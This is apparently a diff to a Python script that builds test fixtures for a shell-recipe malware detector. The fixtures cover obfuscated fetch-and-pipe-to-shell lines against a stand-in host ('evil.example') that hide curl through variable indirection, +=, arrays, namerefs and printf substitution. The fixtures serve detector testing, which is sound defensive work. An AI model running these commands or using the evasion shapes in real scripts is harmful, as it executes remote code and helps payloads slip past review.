@@ -1,16 +1,23 @@
 """Generate the evasion recall fixtures (plan §14).
 
-Six recipe shapes that evade the shipped detection rules, written down
-*before* they are closed.
+Evasion recipe shapes, written down *before* they are closed and kept as the
+record of what the engine can and cannot yet see.
 
 Each fixture is labelled with the rule that is *meant* to catch it and the
-score it is meant to reach - a label it currently fails - and marked
-``known_gap``.  That direction is the one ``gate_known_gaps_unchanged``
-reads: it counts a gap as closed when the fixture stops producing
-``_fixture_failures``, so an open gap has to be a failing label, not a
-passing ``max_score`` pin.  The gate stays green while the shape evades us
-and turns red the moment a patch detects it, which is what forces the
-``known_gap`` flag to come off.
+score it is meant to reach.  A fixture in one of two states:
+
+* ``known_gap=True`` - the label is one the engine currently *fails*.  This
+  is the direction ``gate_known_gaps_unchanged`` reads: an open gap has to
+  be a failing label, so the gate stays green while the shape evades us and
+  turns red the moment a patch detects it, forcing the flag to come off.
+
+* ``known_gap=False`` - a shape a later patch closed.  The flag is dropped
+  and the fixture must now *pass* its label; ``gate_malicious_recall`` picks
+  it up and pins the coverage so it cannot silently regress.
+
+The self-check below enforces both directions, so a fixture cannot sit in
+the wrong state: an open gap that already passes and a covered fixture that
+still fails are both reported.
 
 The self-check below calls the gate's own ``_fixture_failures`` rather than
 re-deriving the condition, so the two cannot drift apart again.
@@ -64,7 +71,7 @@ add("evasion-fetch-via-indirect",
     description="The fetch tool is reached through ${!C} indirection, so the "
                 "resolved line keeps no literal curl/wget for R001/R002/R061 "
                 "and R129 to name",
-    known_gap=True, must_fire=["R132"], min_score=40)
+    known_gap=False, must_fire=["R132"], min_score=40)
 
 # ── 2. The shell at the far end of the pipe is an indirect expansion ─────────
 
@@ -76,21 +83,22 @@ add("evasion-shell-via-indirect",
     ),
     description="curl is variable-routed and the shell is reached through "
                 "${!P}: R001's shell alternation names literals only",
-    known_gap=True, must_fire=["R132"], min_score=40)
+    known_gap=False, must_fire=["R132"], min_score=40)
 
 # ── 3. The fetch tool is accumulated with += ─────────────────────────────────
 
 add("evasion-command-via-plus-eq",
     diff(
         "C+=curl",
-        "C+=https://evil.example/p.sh",
+        "C+=' https://evil.example/p.sh'",
         "$C | bash",
     ),
-    description="C is built only with +=, which the assignment resolver does "
-                "not track, so $C never resolves to a literal curl line",
+    description="C is assembled only with +=, so no single line carries a "
+                "literal curl; once the resolver accumulates +=, $C resolves "
+                "to `curl https://evil.example/p.sh | bash` and R001 owns it",
     # Not R132: nothing here is *indirect*.  Once the tokenizer accumulates
     # +=, $C resolves to a literal `curl ... | bash` and R001 owns it.
-    known_gap=True, must_fire=["R001"], min_score=40)
+    known_gap=False, must_fire=["R001"], min_score=40)
 
 # ── 4. A dependency is accumulated with += ───────────────────────────────────
 
@@ -121,7 +129,7 @@ add("evasion-heredoc-fed-indirect",
     description="The remote-execution line lives inside a heredoc fed "
                 "straight to a shell; the literal pipe-to-shell rules never "
                 "see it once the fetch is indirect",
-    known_gap=True, must_fire=["R132"], min_score=40)
+    known_gap=False, must_fire=["R132"], min_score=40)
 
 # ── 6. A heredoc writes a script that is then sourced ────────────────────────
 
@@ -138,7 +146,46 @@ add("evasion-heredoc-written-indirect",
     description="The recipe writes an executable script into $srcdir and "
                 "sources it; R121/R124 want the writer and the executor in "
                 "the same visible line, and the fetch inside is indirect",
-    known_gap=True, must_fire=["R132"], min_score=40)
+    known_gap=False, must_fire=["R132"], min_score=40)
+
+
+# ── 7. The fetch tool is an array element ────────────────────────────────────
+
+add("evasion-command-via-array-index",
+    diff(
+        "A=(curl)",
+        "${A[0]} https://evil.example/p.sh | bash",
+    ),
+    description="curl is stored as an array element and reached through "
+                "${A[0]}; the resolver folds A only as a whole, never by "
+                "subscript, and ${A[0]} is not the ${!name} form R132 reads, "
+                "so the fetch line keeps no literal curl",
+    known_gap=True, must_fire=["R133"], min_score=40)
+
+# ── 8. The fetch tool is reached through a nameref ───────────────────────────
+
+add("evasion-command-via-nameref",
+    diff(
+        "declare -n R=curl",
+        "$R https://evil.example/p.sh | bash",
+    ),
+    description="declare -n makes R a nameref for curl; the assignment "
+                "resolver does not parse `declare -n name=target`, so $R "
+                "never resolves and the fetch line keeps no literal curl",
+    known_gap=True, must_fire=["R134"], min_score=40)
+
+# ── 9. The fetch tool is assembled in a command substitution ─────────────────
+
+add("evasion-command-via-command-subst",
+    diff(
+        "C=$(printf '%s%s' cur l)",
+        "$C https://evil.example/p.sh | bash",
+    ),
+    description="curl is spelled by a printf inside $( ), which the resolver "
+                "refuses to fold (no static value), so $C stays unresolved "
+                "and no literal curl - split across 'cur' and 'l' - survives "
+                "on any line",
+    known_gap=True, must_fire=["R135"], min_score=40)
 
 
 def main() -> int:
@@ -163,7 +210,10 @@ def main() -> int:
             fpath = args.out / fname
             fpath.write_text(fx["diff_text"])
 
-            entry: dict = {"known_gap": True}
+            known_gap = fx["expect"].get("known_gap", True)
+            entry: dict = {}
+            if known_gap:
+                entry["known_gap"] = True
             for key in ("description", "must_fire", "min_score"):
                 if key in fx["expect"]:
                     entry[key] = fx["expect"][key]
@@ -183,15 +233,23 @@ def main() -> int:
                 },
                 "expected": entry,
             }
-            # An open gap must *fail* its label.  A fixture that passes is
-            # one the engine already detects, and filing it under
-            # "we do not detect this" would be the stale record the gate
-            # exists to prevent.
-            if not _fixture_failures(result):
+            # An open gap must *fail* its label, and a fixture relabelled
+            # covered must *pass* it.  Both directions are checked here so a
+            # patch that closes a gap cannot leave the label stale: filing a
+            # detected shape under "we do not detect this" (known_gap that
+            # passes) and claiming coverage the engine does not have
+            # (known_gap dropped but still failing) are both rejected.
+            fails = _fixture_failures(result)
+            if known_gap and not fails:
                 failures.append(
                     f"{fname}: labelled a known gap but already passes its "
                     f"label - score {fact.final_score}, fired {sorted(result['fired'])}. "
                     "Drop known_gap and move it to the labelled corpus."
+                )
+            elif not known_gap and fails:
+                failures.append(
+                    f"{fname}: labelled covered but still fails its label - "
+                    + "; ".join(fails)
                 )
 
     with open(args.out / "expected.json", "w") as f:
@@ -206,8 +264,10 @@ def main() -> int:
         for fb in failures:
             print(f"  {fb}", file=sys.stderr)
         return 1
-    print(f"\nAll {len(FIXTURES)} evasion fixtures fail their labels, "
-          "which is what an open gap looks like.")
+    open_gaps = sum(1 for fx in FIXTURES if fx["expect"].get("known_gap", True))
+    covered = len(FIXTURES) - open_gaps
+    print(f"\n{open_gaps} open gaps still fail their labels; {covered} "
+          "relabelled-covered fixtures now pass theirs.")
     return 0
 
 
